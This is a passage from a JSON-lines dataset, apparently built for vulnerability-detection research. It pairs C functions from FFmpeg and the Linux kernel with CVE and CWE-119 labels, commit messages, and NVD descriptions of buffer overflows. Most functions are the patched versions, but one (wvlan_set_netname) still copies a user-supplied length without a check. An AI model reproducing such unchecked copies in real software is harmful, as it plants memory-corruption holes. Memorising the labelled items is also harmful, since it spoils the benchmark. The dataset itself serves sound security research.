(s->buf[stream_ptr++]);\n            opcode = 0;\n            if ((s->buf[stream_ptr] & 0x80) != 0) {\n                /* Must behave as opcode 110xxxxx, using colorA computed\n                 * above. Use fake opcode 0x20 to enter switch block at\n                 * the right place */\n                opcode = 0x20;\n                n_blocks = 1;\n            }\n        }\n\n        switch (opcode & 0xe0) {\n\n        /* Skip blocks */\n        case 0x80:\n            while (n_blocks--) {\n              ADVANCE_BLOCK();\n            }\n            break;\n\n        /* Fill blocks with one color */\n        case 0xa0:\n             colorA = AV_RB16 (&s->buf[stream_ptr]);\n             stream_ptr += 2;\n             while (n_blocks--) {\n                ADVANCE_BLOCK()\n                 block_ptr = row_ptr + pixel_ptr;\n                 for (pixel_y = 0; pixel_y < 4; pixel_y++) {\n                     for (pixel_x = 0; pixel_x < 4; pixel_x++){\n                        pixels[block_ptr] = colorA;\n                        block_ptr++;\n                     }\n                     block_ptr += row_inc;\n                 }\n             }\n             break;\n \n        /* Fill blocks with 4 colors */\n        case 0xc0:\n            colorA = AV_RB16 (&s->buf[stream_ptr]);\n            stream_ptr += 2;\n        case 0x20:\n            colorB = AV_RB16 (&s->buf[stream_ptr]);\n            stream_ptr += 2;\n\n            /* sort out the colors */\n            color4[0] = colorB;\n            color4[1] = 0;\n            color4[2] = 0;\n            color4[3] = colorA;\n\n            /* red components */\n            ta = (colorA >> 10) & 0x1F;\n            tb = (colorB >> 10) & 0x1F;\n            color4[1] |= ((11 * ta + 21 * tb) >> 5) << 10;\n            color4[2] |= ((21 * ta + 11 * tb) >> 5) << 10;\n\n            /* green components */\n            ta = (colorA >> 5) & 0x1F;\n            tb = (colorB >> 5) & 0x1F;\n            color4[1] |= ((11 * ta + 21 * tb) >> 5) << 5;\n            color4[2] |= ((21 * ta + 11 * tb) >> 5) << 5;\n\n            /* blue components */\n            ta = colorA & 0x1F;\n            tb = colorB & 0x1F;\n            color4[1] |= ((11 * ta + 21 * tb) >> 5);\n            color4[2] |= ((21 * ta + 11 * tb) >> 5);\n\n             if (s->size - stream_ptr < n_blocks * 4)\n                 return;\n             while (n_blocks--) {\n                ADVANCE_BLOCK();\n                 block_ptr = row_ptr + pixel_ptr;\n                 for (pixel_y = 0; pixel_y < 4; pixel_y++) {\n                     index = s->buf[stream_ptr++];\n                    for (pixel_x = 0; pixel_x < 4; pixel_x++){\n                        idx = (index >> (2 * (3 - pixel_x))) & 0x03;\n                        pixels[block_ptr] = color4[idx];\n                        block_ptr++;\n                     }\n                     block_ptr += row_inc;\n                 }\n             }\n             break;\n \n         /* Fill block with 16 colors */\n         case 0x00:\n             if (s->size - stream_ptr < 16)\n                 return;\n            ADVANCE_BLOCK();\n             block_ptr = row_ptr + pixel_ptr;\n             for (pixel_y = 0; pixel_y < 4; pixel_y++) {\n                 for (pixel_x = 0; pixel_x < 4; pixel_x++){\n                    /* We already have color of upper left pixel */\n                    if ((pixel_y != 0) || (pixel_x !=0)) {\n                        colorA = AV_RB16 (&s->buf[stream_ptr]);\n                        stream_ptr += 2;\n                    }\n                    pixels[block_ptr] = colorA;\n                    block_ptr++;\n                 }\n                 block_ptr += row_inc;\n             }\n             break;\n \n         /* Unknown opcode */\n        default:\n            av_log(s->avctx, AV_LOG_ERROR, \"Unknown opcode %d in rpza chunk.\"\n                 \" Skip remaining %d bytes of chunk data.\\n\", opcode,\n                 chunk_size - stream_ptr);\n            return;\n        } /* Opcode switch */\n    }\n}\n", "func_hash": 199142065752138389978163694222242641122, "file_name": "rpza.c", "file_hash": 145110260770130120514406915106775778424, "cwe": ["CWE-119"], "cve": "CVE-2013-7009", "cve_desc": "The rpza_decode_stream function in libavcodec/rpza.c in FFmpeg before 2.1 does not properly maintain a pointer to pixel data, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted Apple RPZA data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-7009"}
{"idx": 158740, "project": "linux", "commit_id": "7314e613d5ff9f0934f7a0f74ed7973b903315d1", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/7314e613d5ff9f0934f7a0f74ed7973b903315d1", "commit_message": "Fix a few incorrectly checked [io_]remap_pfn_range() calls\n\nNico Golde reports a few straggling uses of [io_]remap_pfn_range() that\nreally should use the vm_iomap_memory() helper.  This trivially converts\ntwo of them to the helper, and comments about why the third one really\nneeds to continue to use remap_pfn_range(), and adds the missing size\ncheck.\n\nReported-by: Nico Golde <nico@ngolde.de>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org.", "target": 0, "func": "static int uio_mmap_physical(struct vm_area_struct *vma)\n {\n \tstruct uio_device *idev = vma->vm_private_data;\n \tint mi = uio_find_mem_index(vma);\n\tstruct uio_mem *mem;\n \tif (mi < 0)\n \t\treturn -EINVAL;\n\tmem = idev->info->mem + mi;\n \n\tif (vma->vm_end - vma->vm_start > mem->size)\n\t\treturn -EINVAL;\n \n\tvma->vm_ops = &uio_physical_vm_ops;\n \tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n \n\t/*\n\t * We cannot use the vm_iomap_memory() helper here,\n\t * because vma->vm_pgoff is the map index we looked\n\t * up above in uio_find_mem_index(), rather than an\n\t * actual page offset into the mmap.\n\t *\n\t * So we just do the physical mmap without a page\n\t * offset.\n\t */\n \treturn remap_pfn_range(vma,\n \t\t\t       vma->vm_start,\n\t\t\t       mem->addr >> PAGE_SHIFT,\n \t\t\t       vma->vm_end - vma->vm_start,\n \t\t\t       vma->vm_page_prot);\n }\n", "func_hash": 37065271855217370564920531672117301493, "file_name": "uio.c", "file_hash": 36047993049944990560762116378541603219, "cwe": ["CWE-119"], "cve": "CVE-2013-6763", "cve_desc": "The uio_mmap_physical function in drivers/uio/uio.c in the Linux kernel before 3.12 does not validate the size of a memory block, which allows local users to cause a denial of service (memory corruption) or possibly gain privileges via crafted mmap operations, a different vulnerability than CVE-2013-4511.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-6763"}
{"idx": 158741, "project": "linux", "commit_id": "7314e613d5ff9f0934f7a0f74ed7973b903315d1", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/7314e613d5ff9f0934f7a0f74ed7973b903315d1", "commit_message": "Fix a few incorrectly checked [io_]remap_pfn_range() calls\n\nNico Golde reports a few straggling uses of [io_]remap_pfn_range() that\nreally should use the vm_iomap_memory() helper.  This trivially converts\ntwo of them to the helper, and comments about why the third one really\nneeds to continue to use remap_pfn_range(), and adds the missing size\ncheck.\n\nReported-by: Nico Golde <nico@ngolde.de>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org.", "target": 0, "func": " int au1100fb_fb_mmap(struct fb_info *fbi, struct vm_area_struct *vma)\n {\n \tstruct au1100fb_device *fbdev;\n \n \tfbdev = to_au1100fb_device(fbi);\n \n \tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n \tpgprot_val(vma->vm_page_prot) |= (6 << 9); //CCA=6\n \n\treturn vm_iomap_memory(vma, fbdev->fb_phys, fbdev->fb_len);\n }\n", "func_hash": 1623279895322387910027742317760626363, "file_name": "au1100fb.c", "file_hash": 77902258379140114528270461117122032874, "cwe": ["CWE-119"], "cve": "CVE-2013-6763", "cve_desc": "The uio_mmap_physical function in drivers/uio/uio.c in the Linux kernel before 3.12 does not validate the size of a memory block, which allows local users to cause a denial of service (memory corruption) or possibly gain privileges via crafted mmap operations, a different vulnerability than CVE-2013-4511.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-6763"}
{"idx": 158742, "project": "linux", "commit_id": "7314e613d5ff9f0934f7a0f74ed7973b903315d1", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/7314e613d5ff9f0934f7a0f74ed7973b903315d1", "commit_message": "Fix a few incorrectly checked [io_]remap_pfn_range() calls\n\nNico Golde reports a few straggling uses of [io_]remap_pfn_range() that\nreally should use the vm_iomap_memory() helper.  This trivially converts\ntwo of them to the helper, and comments about why the third one really\nneeds to continue to use remap_pfn_range(), and adds the missing size\ncheck.\n\nReported-by: Nico Golde <nico@ngolde.de>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org.", "target": 0, "func": " static int au1200fb_fb_mmap(struct fb_info *info, struct vm_area_struct *vma)\n {\n \tstruct au1200fb_device *fbdev = info->par;\n \n \tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n \tpgprot_val(vma->vm_page_prot) |= _CACHE_MASK; /* CCA=7 */\n \n\treturn vm_iomap_memory(vma, fbdev->fb_phys, fbdev->fb_len);\n }\n", "func_hash": 258558073391048829050024809501490522922, "file_name": "au1200fb.c", "file_hash": 40760652179933862360466729479889043833, "cwe": ["CWE-119"], "cve": "CVE-2013-6763", "cve_desc": "The uio_mmap_physical function in drivers/uio/uio.c in the Linux kernel before 3.12 does not validate the size of a memory block, which allows local users to cause a denial of service (memory corruption) or possibly gain privileges via crafted mmap operations, a different vulnerability than CVE-2013-4511.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-6763"}
{"idx": 158745, "project": "linux", "commit_id": "6fb392b1a63ae36c31f62bc3fc8630b49d602b62", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/6fb392b1a63ae36c31f62bc3fc8630b49d602b62", "commit_message": "qeth: avoid buffer overflow in snmp ioctl\n\nCheck user-defined length in snmp ioctl request and allow request\nonly if it fits into a qeth command buffer.\n\nSigned-off-by: Ursula Braun <ursula.braun@de.ibm.com>\nSigned-off-by: Frank Blaschka <frank.blaschka@de.ibm.com>\nReviewed-by: Heiko Carstens <heicars2@linux.vnet.ibm.com>\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nCc: <stable@vger.kernel.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "int qeth_snmp_command(struct qeth_card *card, char __user *udata)\n{\n \tstruct qeth_cmd_buffer *iob;\n \tstruct qeth_ipa_cmd *cmd;\n \tstruct qeth_snmp_ureq *ureq;\n\tunsigned int req_len;\n \tstruct qeth_arp_query_info qinfo = {0, };\n \tint rc = 0;\n \n\tQETH_CARD_TEXT(card, 3, \"snmpcmd\");\n\n\tif (card->info.guestlan)\n\t\treturn -EOPNOTSUPP;\n\n\tif ((!qeth_adp_supported(card, IPA_SETADP_SET_SNMP_CONTROL)) &&\n\t    (!card->options.layer2)) {\n\t\treturn -EOPNOTSUPP;\n\t}\n \t/* skip 4 bytes (data_len struct member) to get req_len */\n \tif (copy_from_user(&req_len, udata + sizeof(int), sizeof(int)))\n \t\treturn -EFAULT;\n\tif (req_len > (QETH_BUFSIZE - IPA_PDU_HEADER_SIZE -\n\t\t       sizeof(struct qeth_ipacmd_hdr) -\n\t\t       sizeof(struct qeth_ipacmd_setadpparms_hdr)))\n\t\treturn -EINVAL;\n \tureq = memdup_user(udata, req_len + sizeof(struct qeth_snmp_ureq_hdr));\n \tif (IS_ERR(ureq)) {\n \t\tQETH_CARD_TEXT(card, 2, \"snmpnome\");\n\t\treturn PTR_ERR(ureq);\n\t}\n\tqinfo.udata_len = ureq->hdr.data_len;\n\tqinfo.udata = kzalloc(qinfo.udata_len, GFP_KERNEL);\n\tif (!qinfo.udata) {\n\t\tkfree(ureq);\n\t\treturn -ENOMEM;\n\t}\n\tqinfo.udata_offset = sizeof(struct qeth_snmp_ureq_hdr);\n\n\tiob = qeth_get_adapter_cmd(card, IPA_SETADP_SET_SNMP_CONTROL,\n\t\t\t\t   QETH_SNMP_SETADP_CMDLENGTH + req_len);\n\tcmd = (struct qeth_ipa_cmd *)(iob->data+IPA_PDU_HEADER_SIZE);\n\tmemcpy(&cmd->data.setadapterparms.data.snmp, &ureq->cmd, req_len);\n\trc = qeth_send_ipa_snmp_cmd(card, iob, QETH_SETADP_BASE_LEN + req_len,\n\t\t\t\t    qeth_snmp_command_cb, (void *)&qinfo);\n\tif (rc)\n\t\tQETH_DBF_MESSAGE(2, \"SNMP command failed on %s: (0x%x)\\n\",\n\t\t\t   QETH_CARD_IFNAME(card), rc);\n\telse {\n\t\tif (copy_to_user(udata, qinfo.udata, qinfo.udata_len))\n\t\t\trc = -EFAULT;\n\t}\n\n\tkfree(ureq);\n\tkfree(qinfo.udata);\n\treturn rc;\n}\n", "func_hash": 169202937829379525760239607583743710857, "file_name": "qeth_core_main.c", "file_hash": 172045772512734913850419912571012990938, "cwe": ["CWE-119"], "cve": "CVE-2013-6381", "cve_desc": "Buffer overflow in the qeth_snmp_command function in drivers/s390/net/qeth_core_main.c in the Linux kernel through 3.12.1 allows local users to cause a denial of service or possibly have unspecified other impact via an SNMP ioctl call with a length value that is incompatible with the command-buffer size.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-6381"}
{"idx": 158756, "project": "linux", "commit_id": "04bcef2a83f40c6db24222b27a52892cba39dffb", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/04bcef2a83f40c6db24222b27a52892cba39dffb", "commit_message": "ipvs: Add boundary check on ioctl arguments\n\nThe ipvs code has a nifty system for doing the size of ioctl command\ncopies; it defines an array with values into which it indexes the cmd\nto find the right length.\n\nUnfortunately, the ipvs code forgot to check if the cmd was in the\nrange that the array provides, allowing for an index outside of the\narray, which then gives a \"garbage\" result into the length, which\nthen gets used for copying into a stack buffer.\n\nFix this by adding sanity checks on these as well as the copy size.\n\n[ horms@verge.net.au: adjusted limit to IP_VS_SO_GET_MAX ]\nSigned-off-by: Arjan van de Ven <arjan@linux.intel.com>\nAcked-by: Julian Anastasov <ja@ssi.bg>\nSigned-off-by: Simon Horman <horms@verge.net.au>\nSigned-off-by: Patrick McHardy <kaber@trash.net>", "target": 0, "func": "do_ip_vs_set_ctl(struct sock *sk, int cmd, void __user *user, unsigned int len)\n{\n\tint ret;\n\tunsigned char arg[MAX_ARG_LEN];\n\tstruct ip_vs_service_user *usvc_compat;\n\tstruct ip_vs_service_user_kern usvc;\n\tstruct ip_vs_service *svc;\n\tstruct ip_vs_dest_user *udest_compat;\n\tstruct ip_vs_dest_user_kern udest;\n\n \tif (!capable(CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n\tif (cmd < IP_VS_BASE_CTL || cmd > IP_VS_SO_SET_MAX)\n\t\treturn -EINVAL;\n\tif (len < 0 || len >  MAX_ARG_LEN)\n\t\treturn -EINVAL;\n \tif (len != set_arglen[SET_CMDID(cmd)]) {\n \t\tpr_err(\"set_ctl: len %u != %u\\n\",\n \t\t       len, set_arglen[SET_CMDID(cmd)]);\n\t\treturn -EINVAL;\n\t}\n\n\tif (copy_from_user(arg, user, len) != 0)\n\t\treturn -EFAULT;\n\n\t/* increase the module use count */\n\tip_vs_use_count_inc();\n\n\tif (mutex_lock_interruptible(&__ip_vs_mutex)) {\n\t\tret = -ERESTARTSYS;\n\t\tgoto out_dec;\n\t}\n\n\tif (cmd == IP_VS_SO_SET_FLUSH) {\n\t\t/* Flush the virtual service */\n\t\tret = ip_vs_flush();\n\t\tgoto out_unlock;\n\t} else if (cmd == IP_VS_SO_SET_TIMEOUT) {\n\t\t/* Set timeout values for (tcp tcpfin udp) */\n\t\tret = ip_vs_set_timeout((struct ip_vs_timeout_user *)arg);\n\t\tgoto out_unlock;\n\t} else if (cmd == IP_VS_SO_SET_STARTDAEMON) {\n\t\tstruct ip_vs_daemon_user *dm = (struct ip_vs_daemon_user *)arg;\n\t\tret = start_sync_thread(dm->state, dm->mcast_ifn, dm->syncid);\n\t\tgoto out_unlock;\n\t} else if (cmd == IP_VS_SO_SET_STOPDAEMON) {\n\t\tstruct ip_vs_daemon_user *dm = (struct ip_vs_daemon_user *)arg;\n\t\tret = stop_sync_thread(dm->state);\n\t\tgoto out_unlock;\n\t}\n\n\tusvc_compat = (struct ip_vs_service_user *)arg;\n\tudest_compat = (struct ip_vs_dest_user *)(usvc_compat + 1);\n\n\t/* We only use the new structs internally, so copy userspace compat\n\t * structs to extended internal versions */\n\tip_vs_copy_usvc_compat(&usvc, usvc_compat);\n\tip_vs_copy_udest_compat(&udest, udest_compat);\n\n\tif (cmd == IP_VS_SO_SET_ZERO) {\n\t\t/* if no service address is set, zero counters in all */\n\t\tif (!usvc.fwmark && !usvc.addr.ip && !usvc.port) {\n\t\t\tret = ip_vs_zero_all();\n\t\t\tgoto out_unlock;\n\t\t}\n\t}\n\n\t/* Check for valid protocol: TCP or UDP, even for fwmark!=0 */\n\tif (usvc.protocol != IPPROTO_TCP && usvc.protocol != IPPROTO_UDP) {\n\t\tpr_err(\"set_ctl: invalid protocol: %d %pI4:%d %s\\n\",\n\t\t       usvc.protocol, &usvc.addr.ip,\n\t\t       ntohs(usvc.port), usvc.sched_name);\n\t\tret = -EFAULT;\n\t\tgoto out_unlock;\n\t}\n\n\t/* Lookup the exact service by <protocol, addr, port> or fwmark */\n\tif (usvc.fwmark == 0)\n\t\tsvc = __ip_vs_service_get(usvc.af, usvc.protocol,\n\t\t\t\t\t  &usvc.addr, usvc.port);\n\telse\n\t\tsvc = __ip_vs_svc_fwm_get(usvc.af, usvc.fwmark);\n\n\tif (cmd != IP_VS_SO_SET_ADD\n\t    && (svc == NULL || svc->protocol != usvc.protocol)) {\n\t\tret = -ESRCH;\n\t\tgoto out_unlock;\n\t}\n\n\tswitch (cmd) {\n\tcase IP_VS_SO_SET_ADD:\n\t\tif (svc != NULL)\n\t\t\tret = -EEXIST;\n\t\telse\n\t\t\tret = ip_vs_add_service(&usvc, &svc);\n\t\tbreak;\n\tcase IP_VS_SO_SET_EDIT:\n\t\tret = ip_vs_edit_service(svc, &usvc);\n\t\tbreak;\n\tcase IP_VS_SO_SET_DEL:\n\t\tret = ip_vs_del_service(svc);\n\t\tif (!ret)\n\t\t\tgoto out_unlock;\n\t\tbreak;\n\tcase IP_VS_SO_SET_ZERO:\n\t\tret = ip_vs_zero_service(svc);\n\t\tbreak;\n\tcase IP_VS_SO_SET_ADDDEST:\n\t\tret = ip_vs_add_dest(svc, &udest);\n\t\tbreak;\n\tcase IP_VS_SO_SET_EDITDEST:\n\t\tret = ip_vs_edit_dest(svc, &udest);\n\t\tbreak;\n\tcase IP_VS_SO_SET_DELDEST:\n\t\tret = ip_vs_del_dest(svc, &udest);\n\t\tbreak;\n\tdefault:\n\t\tret = -EINVAL;\n\t}\n\n\tif (svc)\n\t\tip_vs_service_put(svc);\n\n  out_unlock:\n\tmutex_unlock(&__ip_vs_mutex);\n  out_dec:\n\t/* decrease the module use count */\n\tip_vs_use_count_dec();\n\n\treturn ret;\n}\n", "func_hash": 157614413276462146024331359000881642717, "file_name": "ip_vs_ctl.c", "file_hash": 105962925241335804425777375471367443832, "cwe": ["CWE-119"], "cve": "CVE-2013-4588", "cve_desc": "Multiple stack-based buffer overflows in net/netfilter/ipvs/ip_vs_ctl.c in the Linux kernel before 2.6.33, when CONFIG_IP_VS is used, allow local users to gain privileges by leveraging the CAP_NET_ADMIN capability for (1) a getsockopt system call, related to the do_ip_vs_get_ctl function, or (2) a setsockopt system call, related to the do_ip_vs_set_ctl function.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4588"}
{"idx": 184379, "project": "linux", "commit_id": "04bcef2a83f40c6db24222b27a52892cba39dffb", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/04bcef2a83f40c6db24222b27a52892cba39dffb", "commit_message": "ipvs: Add boundary check on ioctl arguments\n\nThe ipvs code has a nifty system for doing the size of ioctl command\ncopies; it defines an array with values into which it indexes the cmd\nto find the right length.\n\nUnfortunately, the ipvs code forgot to check if the cmd was in the\nrange that the array provides, allowing for an index outside of the\narray, which then gives a \"garbage\" result into the length, which\nthen gets used for copying into a stack buffer.\n\nFix this by adding sanity checks on these as well as the copy size.\n\n[ horms@verge.net.au: adjusted limit to IP_VS_SO_GET_MAX ]\nSigned-off-by: Arjan van de Ven <arjan@linux.intel.com>\nAcked-by: Julian Anastasov <ja@ssi.bg>\nSigned-off-by: Simon Horman <horms@verge.net.au>\nSigned-off-by: Patrick McHardy <kaber@trash.net>", "target": 0, "func": "do_ip_vs_get_ctl(struct sock *sk, int cmd, void __user *user, int *len)\n {\n \tunsigned char arg[128];\n \tint ret = 0;\n\tunsigned int copylen;\n \n \tif (!capable(CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n\tif (cmd < IP_VS_BASE_CTL || cmd > IP_VS_SO_GET_MAX)\n\t\treturn -EINVAL;\n\n \tif (*len < get_arglen[GET_CMDID(cmd)]) {\n \t\tpr_err(\"get_ctl: len %u < %u\\n\",\n \t\t       *len, get_arglen[GET_CMDID(cmd)]);\n \t\treturn -EINVAL;\n \t}\n \n\tcopylen = get_arglen[GET_CMDID(cmd)];\n\tif (copylen > 128)\n\t\treturn -EINVAL;\n\n\tif (copy_from_user(arg, user, copylen) != 0)\n \t\treturn -EFAULT;\n \n \tif (mutex_lock_interruptible(&__ip_vs_mutex))\n\t\treturn -ERESTARTSYS;\n\n\tswitch (cmd) {\n\tcase IP_VS_SO_GET_VERSION:\n\t{\n\t\tchar buf[64];\n\n\t\tsprintf(buf, \"IP Virtual Server version %d.%d.%d (size=%d)\",\n\t\t\tNVERSION(IP_VS_VERSION_CODE), IP_VS_CONN_TAB_SIZE);\n\t\tif (copy_to_user(user, buf, strlen(buf)+1) != 0) {\n\t\t\tret = -EFAULT;\n\t\t\tgoto out;\n\t\t}\n\t\t*len = strlen(buf)+1;\n\t}\n\tbreak;\n\n\tcase IP_VS_SO_GET_INFO:\n\t{\n\t\tstruct ip_vs_getinfo info;\n\t\tinfo.version = IP_VS_VERSION_CODE;\n\t\tinfo.size = IP_VS_CONN_TAB_SIZE;\n\t\tinfo.num_services = ip_vs_num_services;\n\t\tif (copy_to_user(user, &info, sizeof(info)) != 0)\n\t\t\tret = -EFAULT;\n\t}\n\tbreak;\n\n\tcase IP_VS_SO_GET_SERVICES:\n\t{\n\t\tstruct ip_vs_get_services *get;\n\t\tint size;\n\n\t\tget = (struct ip_vs_get_services *)arg;\n\t\tsize = sizeof(*get) +\n\t\t\tsizeof(struct ip_vs_service_entry) * get->num_services;\n\t\tif (*len != size) {\n\t\t\tpr_err(\"length: %u != %u\\n\", *len, size);\n\t\t\tret = -EINVAL;\n\t\t\tgoto out;\n\t\t}\n\t\tret = __ip_vs_get_service_entries(get, user);\n\t}\n\tbreak;\n\n\tcase IP_VS_SO_GET_SERVICE:\n\t{\n\t\tstruct ip_vs_service_entry *entry;\n\t\tstruct ip_vs_service *svc;\n\t\tunion nf_inet_addr addr;\n\n\t\tentry = (struct ip_vs_service_entry *)arg;\n\t\taddr.ip = entry->addr;\n\t\tif (entry->fwmark)\n\t\t\tsvc = __ip_vs_svc_fwm_get(AF_INET, entry->fwmark);\n\t\telse\n\t\t\tsvc = __ip_vs_service_get(AF_INET, entry->protocol,\n\t\t\t\t\t\t  &addr, entry->port);\n\t\tif (svc) {\n\t\t\tip_vs_copy_service(entry, svc);\n\t\t\tif (copy_to_user(user, entry, sizeof(*entry)) != 0)\n\t\t\t\tret = -EFAULT;\n\t\t\tip_vs_service_put(svc);\n\t\t} else\n\t\t\tret = -ESRCH;\n\t}\n\tbreak;\n\n\tcase IP_VS_SO_GET_DESTS:\n\t{\n\t\tstruct ip_vs_get_dests *get;\n\t\tint size;\n\n\t\tget = (struct ip_vs_get_dests *)arg;\n\t\tsize = sizeof(*get) +\n\t\t\tsizeof(struct ip_vs_dest_entry) * get->num_dests;\n\t\tif (*len != size) {\n\t\t\tpr_err(\"length: %u != %u\\n\", *len, size);\n\t\t\tret = -EINVAL;\n\t\t\tgoto out;\n\t\t}\n\t\tret = __ip_vs_get_dest_entries(get, user);\n\t}\n\tbreak;\n\n\tcase IP_VS_SO_GET_TIMEOUT:\n\t{\n\t\tstruct ip_vs_timeout_user t;\n\n\t\t__ip_vs_get_timeouts(&t);\n\t\tif (copy_to_user(user, &t, sizeof(t)) != 0)\n\t\t\tret = -EFAULT;\n\t}\n\tbreak;\n\n\tcase IP_VS_SO_GET_DAEMON:\n\t{\n\t\tstruct ip_vs_daemon_user d[2];\n\n\t\tmemset(&d, 0, sizeof(d));\n\t\tif (ip_vs_sync_state & IP_VS_STATE_MASTER) {\n\t\t\td[0].state = IP_VS_STATE_MASTER;\n\t\t\tstrlcpy(d[0].mcast_ifn, ip_vs_master_mcast_ifn, sizeof(d[0].mcast_ifn));\n\t\t\td[0].syncid = ip_vs_master_syncid;\n\t\t}\n\t\tif (ip_vs_sync_state & IP_VS_STATE_BACKUP) {\n\t\t\td[1].state = IP_VS_STATE_BACKUP;\n\t\t\tstrlcpy(d[1].mcast_ifn, ip_vs_backup_mcast_ifn, sizeof(d[1].mcast_ifn));\n\t\t\td[1].syncid = ip_vs_backup_syncid;\n\t\t}\n\t\tif (copy_to_user(user, &d, sizeof(d)) != 0)\n\t\t\tret = -EFAULT;\n\t}\n\tbreak;\n\n\tdefault:\n\t\tret = -EINVAL;\n\t}\n\n  out:\n\tmutex_unlock(&__ip_vs_mutex);\n\treturn ret;\n}\n", "func_hash": 17115367795766588006088732396184263937, "file_name": "ip_vs_ctl.c", "file_hash": 105962925241335804425777375471367443832, "cwe": ["CWE-119"], "cve": "CVE-2013-4588", "cve_desc": "Multiple stack-based buffer overflows in net/netfilter/ipvs/ip_vs_ctl.c in the Linux kernel before 2.6.33, when CONFIG_IP_VS is used, allow local users to gain privileges by leveraging the CAP_NET_ADMIN capability for (1) a getsockopt system call, related to the do_ip_vs_get_ctl function, or (2) a setsockopt system call, related to the do_ip_vs_set_ctl function.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4588"}
{"idx": 31176, "project": "linux", "commit_id": "b5e2f339865fb443107e5b10603e53bbc92dc054", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/b5e2f339865fb443107e5b10603e53bbc92dc054", "commit_message": "staging: wlags49_h2: buffer overflow setting station name\n\nWe need to check the length parameter before doing the memcpy().  I've\nactually changed it to strlcpy() as well so that it's NUL terminated.\n\nYou need CAP_NET_ADMIN to trigger these so it's not the end of the\nworld.\n\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 0, "func": "int wvlan_set_netname(struct net_device *dev,\n\t\t      struct iw_request_info *info,\n\t\t      union iwreq_data *wrqu,\n\t\t      char *extra)\n{\n\tstruct wl_private *lp = wl_priv(dev);\n\tunsigned long flags;\n\tint ret = 0;\n\t/*------------------------------------------------------------------------*/\n\n\n\tDBG_FUNC(\"wvlan_set_netname\");\n\tDBG_ENTER(DbgInfo);\n\n\twl_lock(lp, &flags);\n\n\tmemset(lp->NetworkName, 0, sizeof(lp->NetworkName));\n\tmemcpy(lp->NetworkName, extra, wrqu->data.length);\n\n\t/* Commit the adapter parameters */\n\twl_apply(lp);\n\twl_unlock(lp, &flags);\n\n\tDBG_LEAVE(DbgInfo);\n\treturn ret;\n} /* wvlan_set_netname */\n", "func_hash": 162205244003191236476247108474641534195, "file_name": "wl_priv.c", "file_hash": 60757582669243507829230314014987153993, "cwe": ["CWE-119"], "cve": "CVE-2013-4514", "cve_desc": "Multiple buffer overflows in drivers/staging/wlags49_h2/wl_priv.c in the Linux kernel before 3.12 allow local users to cause a denial of service or possibly have unspecified other impact by leveraging the CAP_NET_ADMIN capability and providing a long station-name string, related to the (1) wvlan_uil_put_info and (2) wvlan_set_station_nickname functions.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4514"}
{"idx": 158762, "project": "linux", "commit_id": "b5e2f339865fb443107e5b10603e53bbc92dc054", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/b5e2f339865fb443107e5b10603e53bbc92dc054", "commit_message": "staging: wlags49_h2: buffer overflow setting station name\n\nWe need to check the length parameter before doing the memcpy().  I've\nactually changed it to strlcpy() as well so that it's NUL terminated.\n\nYou need CAP_NET_ADMIN to trigger these so it's not the end of the\nworld.\n\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 0, "func": "int wvlan_uil_put_info(struct uilreq *urq, struct wl_private *lp)\n{\n\tint                     result = 0;\n \tltv_t                   *pLtv;\n \tbool_t                  ltvAllocated = FALSE;\n \tENCSTRCT                sEncryption;\n\tsize_t\t\t\tlen;\n \n #ifdef USE_WDS\n \thcf_16                  hcfPort  = HCF_PORT_0;\n#endif  /* USE_WDS */\n\t/*------------------------------------------------------------------------*/\n\tDBG_FUNC(\"wvlan_uil_put_info\");\n\tDBG_ENTER(DbgInfo);\n\n\n\tif (urq->hcfCtx == &(lp->hcfCtx)) {\n\t\tif (capable(CAP_NET_ADMIN)) {\n\t\t\tif ((urq->data != NULL) && (urq->len != 0)) {\n\t\t\t\t/* Make sure that we have at least a command and length to send. */\n\t\t\t\tif (urq->len < (sizeof(hcf_16) * 2)) {\n\t\t\t\t\turq->len = sizeof(lp->ltvRecord);\n\t\t\t\t\turq->result = UIL_ERR_LEN;\n\t\t\t\t\tDBG_ERROR(DbgInfo, \"No Length/Type in LTV!!!\\n\");\n\t\t\t\t\tDBG_ERROR(DbgInfo, 